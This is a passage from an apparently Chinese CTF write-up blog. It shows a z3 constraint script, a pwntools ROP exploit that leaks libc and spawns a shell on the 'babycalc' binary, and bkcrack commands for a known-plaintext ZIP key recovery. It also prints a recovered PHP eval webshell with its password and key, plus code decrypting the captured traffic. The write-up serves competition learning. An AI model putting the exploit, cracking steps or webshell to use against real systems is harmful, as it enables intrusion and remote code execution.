- v8) * v16 == <span class="hljs-number">32835</span>)<br>s.add((v4 * v3 - v5) * v6 == <span class="hljs-number">44170</span>)<br>s.add((v5 + v4 * v3) * v6 == <span class="hljs-number">51590</span>)<br>s.add(v9 * v8 * v7 - v10 == <span class="hljs-number">61549</span>)<br>s.add(v10 * v15 + v4 + v18 == <span class="hljs-number">19037</span>)<br>s.add(v9 * v8 * v7 + v10 == <span class="hljs-number">61871</span>)<br>s.add((v8 * v7 - v9) * v10 == <span class="hljs-number">581693</span>)<br>s.add(v11 == <span class="hljs-number">50</span>)<br>s.add((v9 + v8 * v7) * v10 == <span class="hljs-number">587167</span>)<br>s.add(v13 * v12 * v11 - v14 == <span class="hljs-number">1388499</span>)<br>s.add(v13 * v12 * v11 + v14 == <span class="hljs-number">1388701</span>)<br>s.add((v12 * v11 - v13) * v14 == <span class="hljs-number">640138</span>)<br>s.add((v11 * v5 - v16) * v12 == <span class="hljs-number">321081</span>)<br>s.add((v13 + v12 * v11) * v14 == <span class="hljs-number">682962</span>)<br>s.add(v17 * v16 * v15 - v18 == <span class="hljs-number">563565</span>)<br>s.add(v17 * v16 * v15 + v18 == <span class="hljs-number">563571</span>)<br>s.add(v14 == <span class="hljs-number">101</span>)<br>s.add((v16 * v15 - v17) * v18 == <span class="hljs-number">70374</span>)<br>s.add((v17 + v16 * v15) * v18 == <span class="hljs-number">70518</span>)<br>s.check()<br>n=s.model()<br><span class="hljs-built_in">print</span>([n.get_interp(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ns])<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">num,ind,data=<span class="hljs-string">b&#x27;&#x27;</span></span>):<br>    p.readuntil(<span class="hljs-string">&#x27;number-&#x27;</span>)<br>    pay=[<span class="hljs-number">19</span>, <span class="hljs-number">36</span>, <span class="hljs-number">53</span>, <span class="hljs-number">70</span>, <span class="hljs-number">55</span>, <span class="hljs-number">66</span>, <span class="hljs-number">17</span>, <span class="hljs-number">161</span>, <span class="hljs-number">50</span>, <span class="hljs-number">131</span>, <span class="hljs-number">212</span>, <span class="hljs-number">101</span>, <span class="hljs-number">118</span>, <span class="hljs-number">199</span>, <span class="hljs-number">24</span>, <span class="hljs-number">3</span>]<br>    payload=<span class="hljs-built_in">str</span>(num&amp;<span class="hljs-number">0xff</span>).encode()<br>    payload=payload.ljust(<span class="hljs-number">0x38</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload+=data<br>    payload=payload.ljust(<span class="hljs-number">0xd0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload+=<span class="hljs-built_in">bytes</span>(pay)<br>    payload=payload.ljust(<span class="hljs-number">0xfc</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">if</span> ind&lt;<span class="hljs-number">0</span>:<br>        ind=-ind<br>        ind=<span class="hljs-number">0xffffffff</span>^ind<br>        ind+=<span class="hljs-number">1</span><br>        ind=ind&amp;<span class="hljs-number">0xffffffff</span><br>    payload+=p32(ind)<br>    p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>e=ELF(<span class="hljs-string">&#x27;./babycalc&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>context.binary=e<br>bss=e.bss(<span class="hljs-number">0x500</span>)<br>leave=<span class="hljs-number">0x400c18</span><br>rdi=<span class="hljs-number">0x0000000000400ca3</span><br>puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br>pop_xx=<span class="hljs-number">0x400c9a</span><br>read_got=e.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>call=<span class="hljs-number">0x400c80</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    <span class="hljs-comment">#attack(&quot;bp 0x400bb7&quot;)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func_got))<br>    payload=p64(rdi)+p64(func_got)+p64(puts)<br>    pop=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,read_got,<span class="hljs-number">0x400</span>,bss+<span class="hljs-number">0x8</span>,<span class="hljs-number">0</span>,call]<br>    pop1=[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,bss+<span class="hljs-number">0x8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,leave]<br>    payload+=p64(pop_xx)+flat(pop)+flat(pop1)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><br>    edit(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x38</span>,payload)<br>    p.readuntil(<span class="hljs-string">&#x27;good done\n&#x27;</span>)<br>    d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libc=LibcSearcher(func,d)<br>    system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>    bin_sh=libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>    payload=p64(bss+<span class="hljs-number">0x100</span>)+p64(rdi)+p64(bin_sh)+p64(system)<br>    p.send(payload)<br><br>    p.interactive()<br>        <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&quot;./babycalc&quot;</span>)<br><span class="hljs-comment">#        attach(p,&#x27;bp 0x400bb7&#x27;)</span><br>        pwn()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    p.close()<br></code></pre></td></tr></table></figure><h1 id="Misc">Misc</h1><h2 id="take-the-zip-easy">take_the_zip_easy</h2><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-take_the_zip_easy.jpg" srcset="/img/loading.gif" lazyload alt=""><br>题目给了一个<code>zipeasy.zip</code>文件，里面有两个文件都是真加密，那么只能爆破密码了，但是如果单纯的爆破的话，需要很长时间才可能成功，不过<code>zipeasy.zip</code>中有一个<code>dasflow.zip</code>，这个文件中有部分字节是已知的，所以可以通过<code>bkcrack</code>进行明文爆破</p><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-take_the_zip_easy-1.jpg" srcset="/img/loading.gif" lazyload alt=""><br>因为知道的信息较少，所以爆破的时间比较长，在爆破的时候可以爆破两次<br>一次猜测dasflow.zip不是加密压缩包,那么命令就是<code>bkcrack -C zipeasy.zip -c dasflow.zip -x 0 504b030414000000 -x 502393 504b050600</code><br>另一次猜测dasflow.zip是加密压缩包,那么命令就是<code>bkcrack -C zipeasy.zip -c dasflow.zip -x 0 504b030414000100 -x 502393 504b050600</code><br>从结果来看，<code>dasflow.zip</code>不是加密的压缩包，爆破之后获得的<code>key</code>为<code>2b7d78f3 0ebcabad a069728c</code><br>执行<code>bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip</code>导出<code>dasflow.zip</code>，解压之后是<code>dasflow.pcapng</code><br>分析数据包中的<code>http数据</code>，发现上传了一个<code>eval.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;air123&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;HBUARVJfUxFTFxAIWENEBUFNSAw%2BOBI6ZSAwCFhDRAVBTUgMPjhQEFgG.....&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)),<span class="hljs-variable">$key</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    在一次请求中，发送了大量的数据</span><br><span class="hljs-comment">    对数据解密之后获得一段代码</span><br><span class="hljs-comment">    代码较长，只截取重要部分</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$parameters</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$_SES</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"><span class="hljs-variable">$pms</span></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$ERRMSG</span>;<br><br>    <span class="hljs-title function_ invoke__">reDefSystemFunc</span>();<br>    <span class="hljs-variable">$_SES</span>=&amp;<span class="hljs-title function_ invoke__">getSession</span>();<br>    @<span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$sessioId</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">session_id</span>());<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$sessioId</span>]))&#123;<br>        <span class="hljs-variable">$_SES</span>=<span class="hljs-title function_ invoke__">unserialize</span>((<span class="hljs-title function_ invoke__">S1MiwYYr</span>(<span class="hljs-title function_ invoke__">base64Decode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$sessioId</span>],<span class="hljs-variable">$sessioId</span>),<span class="hljs-variable">$sessioId</span>)));<br>    &#125;<br>    @<span class="hljs-title function_ invoke__">session_write_close</span>();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">canCallGzipDecode</span>()==<span class="hljs-number">1</span>&amp;&amp;@<span class="hljs-title function_ invoke__">isGzipStream</span>(<span class="hljs-variable">$pms</span>))&#123;<br>        <span class="hljs-variable">$pms</span>=<span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-variable">$pms</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            从这里看出恶意用户执行的命令，不仅经过eval.php的解密</span><br><span class="hljs-comment">            还要进行一次gzdecode</span><br><span class="hljs-comment">        */</span><br>    &#125;<br>    <span class="hljs-title function_ invoke__">formatParameter</span>(<span class="hljs-variable">$pms</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SES</span>[<span class="hljs-string">&quot;bypass_open_basedir&quot;</span>])&amp;&amp;<span class="hljs-variable">$_SES</span>[<span class="hljs-string">&quot;bypass_open_basedir&quot;</span>]==<span class="hljs-literal">true</span>)&#123;<br>        @<span class="hljs-title function_ invoke__">bypass_open_basedir</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_existsEx</span>(<span class="hljs-string">&quot;set_error_handler&quot;</span>))&#123;<br>        @<span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;payloadErrorHandler&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_existsEx</span>(<span class="hljs-string">&quot;set_exception_handler&quot;</span>))&#123;<br>        @<span class="hljs-title function_ invoke__">set_exception_handler</span>(<span class="hljs-string">&quot;payloadExceptionHandler&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$result</span>=@<span class="hljs-title function_ invoke__">evalFunc</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>==<span class="hljs-literal">null</span>||<span class="hljs-variable">$result</span>===<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-variable">$ERRMSG</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SES</span>!==<span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-title function_ invoke__">session_start</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$sessioId</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">S1MiwYYr</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SES</span>),<span class="hljs-variable">$sessioId</span>));<br>        @<span class="hljs-title function_ invoke__">session_write_close</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">canCallGzipEncode</span>())&#123;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">gzencode</span>(<span class="hljs-variable">$result</span>,<span class="hljs-number">6</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            从这里可以看出，返回的数据先进行了gzencode，然后再是eval.php的加密</span><br><span class="hljs-comment">            </span><br><span class="hljs-comment">        */</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用命令<code>tshark -r dasflow.pcapng -T fields -e text -Y &quot;http contains eval.php or http contains PHPSESSID&quot;</code>获取恶意用户发送和服务器返回的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;J+5pNzMyNmU2Zqj6PzFxueQcYzczMg==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zqj6PzFxueQcYzczMg==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOqa0EPMTZk&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2ZkgaFuZ7LRQshTUz294lUGxjNTk=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2ZigYcv3nT/BNgTUzmc2wYmxjNTk=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zi64+Ds0VTQhjsQY8BRPyCrY2Nc3rMIcDDCIbRk+e9Cor9ykIJ9Gsl0zKfuMVE5XokKpeKRqt3rZnvp2eHTEDhbeeedepetBoZ2Dep0/+SVgE0BxQgLxLV9M7RheDCgxiQpFV9mQfNl2T2PI2eE6435U0MeIlGQ4ZQ==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zqj5cnibtPMurvuY4nsse68v+er6Hq31hKszuCVScXY95SXo47T4xKF1GTONQKUqUGM1OQ==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2ZjBlcX1/rfQu1mV7+X8pYbVLG/AefClpVTHi1zA2QeegNC45MTY=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zkj7iWMG0Got0GX7+Rk0fq5M+HLQNGQWzDVrJzI2ZQ==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOqa0EPMTZk&quot;</span>);<br><span class="hljs-variable">$comm</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;VQAVX1xWeARbAGExOTE2EF0WFQ==&quot;</span>,<span class="hljs-string">&quot;VQAVX1xWeARbAGEyOTE2A2cGDVhAVw==&quot;</span>,<span class="hljs-string">&quot;VQAVX1xWeARbAGExOTE2EF0WFQ==&quot;</span>,<span class="hljs-string">&quot;VQAVX1xWeARbAGE4OTE2A10RI1ZAW1UWfwsFWg==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1VTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4KTJnCYNlV/QoTP77fccu+igG1z9beslwKBf5/P97qX1kY1jYWJ40OGVh&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1RTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdcYqqt69fxiNgjXMgT/fxus/iqSfvV8U4Y+Dy+ae39Aq/moLvlyMDZDd1wCYzMyNg==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1VTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4TDVnCYNlV/QoTP77fccu+igG1z9beslwKBf5/P97qX1kY908xXE0OGVh&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1ZTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4TDXlbmMG1mtWrXoe+/4qxy6veFzTMA51yCl6Rfz5qHupKDQ5qyDB1TdhNzM=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1JTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4TDXl6mJkVIo2Uvt+H/+teZQo+XRU1GLSKMx/fkT4qvsor344MYC0Q5YyNzMy&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3&quot;</span>,<span 